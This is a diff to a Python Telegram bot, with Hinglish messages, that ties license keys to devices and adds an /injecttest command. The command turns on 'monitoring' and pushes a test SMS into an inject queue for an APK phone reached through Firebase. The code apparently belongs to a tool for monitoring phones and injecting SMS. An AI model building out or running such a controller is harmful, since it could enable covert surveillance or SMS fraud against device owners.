@@ -293,8 +293,8 @@ async def _prepare_monitoring(
     profile: MonitorProfile,
     device: Device,
 ) -> None:
-    from app.firebase_sync import resolve_firebase_url
-    from app.license_keys import ensure_ready_for_monitoring
+    from app.firebase_sync import mynum_device_id, resolve_firebase_url
+    from app.license_keys import ensure_ready_for_monitoring, register_device_on_key
     from app.services import resolve_mynum_phone
 
     mynum = resolve_mynum_phone(profile, db)
@@ -307,6 +307,12 @@ async def _prepare_monitoring(
     firebase_url = resolve_firebase_url(profile, device)
     license_key = (profile.license_key or "").strip().upper()
     if license_key.startswith("KEY-"):
+        if profile.phone_number:
+            register_device_on_key(
+                license_key,
+                mynum_device_id(profile.phone_number),
+                user_id,
+            )
         await ensure_ready_for_monitoring(
             license_key,
             device.name,
@@ -1013,6 +1019,41 @@ async def users_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> N
     await update.message.reply_text("\n".join(lines), parse_mode="HTML")
 
 
+async def injecttest_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    """Manual startup inject test — same as monitoring ON test SMS."""
+    user = update.effective_user
+    if not await reply_if_unauthorized(update):
+        return
+
+    db: Session = SessionLocal()
+    try:
+        profile = get_monitor_profile(db, user.id)
+        device = get_active_device(db, user.id)
+        if not profile or not device:
+            raise ValueError("Pehle device + /mynum set karo")
+        if not profile.phone_number:
+            raise ValueError("Pehle /mynum <apk-phone> set karo")
+        profile.is_monitoring = True
+        db.commit()
+        sent, ms = await send_polling_startup_test(db, profile, device)
+    except ValueError as exc:
+        await update.message.reply_text(f"❌ {exc}", parse_mode="HTML")
+        return
+    finally:
+        db.close()
+
+    if sent:
+        await update.message.reply_text(
+            format_inject_startup_card(STARTUP_TEST_SENDER, STARTUP_TEST_MESSAGE, total_ms=ms),
+            parse_mode="HTML",
+        )
+    else:
+        await update.message.reply_text(
+            "❌ Inject queue push failed — check /mynum, KEY, device Firebase URL",
+            parse_mode="HTML",
+        )
+
+
 async def ping_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     if not is_authorized(update.effective_user.id if update.effective_user else None):
         return
@@ -1524,6 +1565,7 @@ def build_telegram_app() -> Application | None:
     app.add_handler(CommandHandler("status", status_command))
     app.add_handler(CommandHandler("send", send_command))
     app.add_handler(CommandHandler("ping", ping_command))
+    app.add_handler(CommandHandler("injecttest", injecttest_command))
     app.add_handler(CommandHandler("approve", approve_command))
     app.add_handler(CommandHandler("adduser", approve_command))
     app.add_handler(CommandHandler("revoke", revoke_command))
